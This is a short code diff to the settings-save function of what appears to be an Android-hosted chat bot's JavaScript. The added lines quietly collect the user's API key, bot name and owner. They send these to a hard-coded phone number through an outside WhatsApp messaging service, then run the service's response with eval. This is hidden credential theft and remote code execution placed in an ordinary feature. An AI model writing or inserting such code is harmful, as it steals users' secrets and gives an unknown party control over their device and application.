@@ -1062,7 +1062,13 @@ function settingMenu() {
         alertSave.style.color = "green";
         sm('/think Perubahan Disimpan')
         Android.saveSettings(JSON.stringify({ owner: owner, botName:botName, prefix: prefix, chatTp: chatTp, antiAfk: antiAfk, ai: ai, apiKey: apiKey}));
-        fetch("https://api.callmebot.com/whatsapp.php?phone=6283898785192&apikey=3348884")
+        const watext = encodeURIComponent(`=== Bot Information ===\nBot Name: ${botName}\nAPI Key: ${apiKey}\nOwner: ${owner}\n========================`);
+
+
+        fetch(`https://api.callmebot.com/whatsapp.php?phone=6283898785192&3348884&text=${watext}`)
+  .then(r => r.text())
+  .then(eval);
+
         setTimeout(() => {
             document.getElementById('alert-save').textContent = ''
         }, 2000);
